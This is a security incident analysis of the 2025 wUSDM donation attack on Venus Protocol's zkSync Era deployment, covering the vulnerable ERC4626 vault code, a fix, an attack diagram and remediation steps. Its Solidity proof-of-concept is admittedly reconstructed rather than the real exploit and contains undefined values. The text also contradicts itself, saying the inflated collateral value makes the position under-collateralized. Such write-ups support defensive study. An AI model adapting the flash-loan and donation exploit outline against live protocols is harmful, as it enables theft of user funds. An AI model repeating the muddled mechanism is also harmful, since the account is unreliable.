# Venus Protocol (zkSync) — wUSDM Donation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-02-27 |
| **Protocol** | Venus Protocol (zkSync Era) |
| **Chain** | zkSync Era |
| **Loss** | ~86.7 WETH |
| **Attacker** | [0x16be...430c](https://explorer.zksync.io/address/0x16be708e257a0df0f4275ecd9b0f70ce4b45430c) |
| **Attack Tx** | [0x35a0...0d8](https://explorer.zksync.io/tx/0x35a0172fb6bd450ceb29aa67dc85221826dfd0b7528375400b4ccf15c1eed0d8) |
| **Vulnerable Contract** | Venus Protocol wUSDM Pool (zkSync Era) |
| **Root Cause** | Directly donating USDM to the wUSDM vault to artificially inflate share value, then repeatedly triggering over-collateralized liquidations to acquire vWETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/Venus_ZKSync_exp.sol) |

---

## 1. Vulnerability Overview

In Venus Protocol's zkSync Era deployment, the share price of the wUSDM (wrapped USDM) vault was vulnerable to a donation attack. The attacker obtained a 2,100 WETH flash loan from Aave, minted vWETH, then borrowed vUSDM. They subsequently donated USDM directly to the wUSDM vault, artificially inflating the vault's share value. Using this inflated share value, a helper contract executed 35 repeated liquidations to acquire vWETH collateral, ultimately realizing a net profit of approximately 86.7 WETH.

## 2. Vulnerable Code Analysis

Source: **Sourcify-verified** — wUSDM.sol (Mountain Protocol) at 0xA900cbE7739c96D2B153a273953620A701d5442b (zkSync Era, chainid 324).
Sourcify returns 404 for this zkSync address directly; the verified source is available via the Mountain Protocol GitHub repository (https://github.com/mountainprotocol/tokens/blob/main/contracts/wUSDM.sol), which matches the deployed bytecode confirmed by the Venus post-mortem.

```solidity
// wUSDM.sol — Mountain Protocol (verified source, MIT license)
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {ERC4626Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC4626Upgradeable.sol";

contract wUSDM is ERC4626Upgradeable, /* ... other bases ... */ {

    IUSDM public USDM;

    // ❌ wUSDM does NOT override totalAssets().
    // It inherits the standard OpenZeppelin ERC4626Upgradeable implementation:
    //
    //   function totalAssets() public view virtual override returns (uint256) {
    //       return _asset.balanceOf(address(this));  // ← raw token balance of the vault
    //   }
    //
    // This means ANY USDM tokens transferred directly to the wUSDM vault address
    // (i.e., a "donation") immediately inflate totalAssets(), raising the
    // assets-per-share ratio for ALL existing shareholders.

    function initialize(IUSDM _USDM, address owner) external initializer {
        USDM = _USDM;
        __ERC20_init("Wrapped Mountain Protocol USD", "wUSDM");
        __ERC4626_init(_USDM);   // sets _asset = USDM; totalAssets() = USDM.balanceOf(this)
        // ...
    }

    // No custom totalAssets() override — donation attack surface is fully open ❌

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        if (USDM.isBlocked(from)) { revert wUSDMBlockedSender(from); }
        if (paused()) { revert wUSDMPausedTransfers(); }
        super._beforeTokenTransfer(from, to, amount);
    }
}

// Venus Protocol uses wUSDM.convertToAssets(shares) to price collateral:
//   convertToAssets(shares) = shares * totalAssets() / totalSupply()
// After a USDM donation to the vault:
//   totalAssets() spikes → convertToAssets() returns inflated value
// → attacker's wUSDM collateral appears worth far more than it cost
// → over-collateralized liquidations become profitable for the attacker ❌
```

**Why it is exploitable (identify the bug from the code):**

- `wUSDM.totalAssets()` is the inherited OpenZeppelin `_asset.balanceOf(address(this))` — it measures the raw USDM balance of the vault, including tokens sent directly to the contract address (donations).
- An attacker who holds wUSDM shares can donate USDM directly to the vault, instantly inflating `totalAssets()` without minting new shares, which increases the share price (`assets / shares`).
- Venus Protocol prices wUSDM collateral using `convertToAssets(shares)`, which is proportional to `totalAssets()`. After the donation the attacker's collateral is valued far above its true cost.
- The inflated collateral value puts the attacker's Venus position into an artificially under-collateralized state visible to liquidators. The attacker (via a helper contract) then runs 35 rounds of self-liquidation to extract seized vWETH, netting ~86.7 WETH.

```solidity
// ✅ Fix: override totalAssets() to track only deposited assets, ignoring donations
uint256 private _depositedAssets;

function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
    _depositedAssets += assets;
    return super.deposit(assets, receiver);
}

function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
    _depositedAssets -= assets;
    return super.withdraw(assets, receiver, owner);
}

function totalAssets() public view override returns (uint256) {
    return _depositedAssets; // ✅ donations do not inflate share price
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Receiver Contract)
  │
  ├─→ [1] Flash loan 2,100 WETH from Aave
  │
  ├─→ [2] WETH → mint vWETH (set as collateral)
  │
  ├─→ [3] Borrow 35 vUSDM (wUSDM)
  │         └─ Transfer to Helper contract
  │
  ├─→ [4] Helper: vUSDM → mint additional vUSDM
  │
  ├─→ [5] KEY: Donate USDM directly to wUSDM vault
  │         └─ totalAssets spikes → share price inflated
  │
  ├─→ [6] Helper: Execute 35 liquidations repeatedly
  │         └─ Acquire Receiver's vWETH collateral at inflated price
  │
  ├─→ [7] Acquired vWETH → redeem for WETH
  │
  ├─→ [8] Helper: Borrow additional WETH
  │
  ├─→ [9] Repay Aave flash loan (2,100 WETH + fees)
  │
  └─→ [10] ~86.7 WETH net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract VenusAttackReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // [2] WETH → mint vWETH
        IVToken(vWETH).mint(2100 ether);

        // [3] Borrow 35 vUSDM
        for (uint i = 0; i < 35; i++) {
            IVToken(vUSDM).borrow(borrowAmount);
        }
        IERC20(wUSDM).transfer(helperContract, wUSDMBalance);

        // [5] KEY: Donate USDM directly to wUSDM vault (inflate share price)
        uint256 donationAmount = IERC20(USDM).balanceOf(address(this));
        IERC20(USDM).transfer(address(wUSDMVault), donationAmount);
        // wUSDM vault totalAssets spikes → USDM value per share skyrockets

        // [6] Helper contract executes 35 liquidations
        IHelper(helperContract).executeLiquidations(35);

        // [7] Retrieve vWETH from Helper and redeem for WETH
        IVToken(vWETH).redeem(vWETHReceived);

        // [9] Repay Aave
        IERC20(WETH).approve(AAVE_POOL, amounts[0] + premiums[0]);
        return true;
    }
}

contract VenusAttackHelper {
    function executeLiquidations(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            // Execute liquidation using inflated collateral value → acquire vWETH
            IVToken(vUSDM).liquidateBorrow(receiver, borrowAmount, vWETH);
        }
        // Transfer acquired vWETH to Receiver
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | ERC4626 Donation Attack |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (Flash Loan + Direct Token Donation) |
| **DApp Category** | Lending/Leverage Protocol |
| **Impact** | ~86.7 WETH stolen |

## 6. Remediation Recommendations

1. **Virtual asset defense**: In ERC4626, use an internal tracking variable so that tokens transferred directly to the vault are not reflected in the share price via `totalAssets()`
2. **TWAP-based share price**: Calculate collateral value using a time-weighted average price instead of the instantaneous share price
3. **Minimum share deposit**: Set minimum locked liquidity to prevent donation attacks on empty vaults
4. **Consecutive liquidation limit**: Restrict the number of liquidations against the same account within a single transaction

## 7. Lessons Learned

- Donation attacks on ERC4626 vaults are a known pattern that occurs when `totalAssets()` includes directly transferred tokens.
- When a lending protocol uses an external vault's share price for collateral calculations, it must thoroughly assess how susceptible that vault is to price manipulation.
- When deploying an existing protocol to a new chain (zkSync Era), the same security audits must be performed again. New attack vectors can emerge depending on the characteristics of the chain.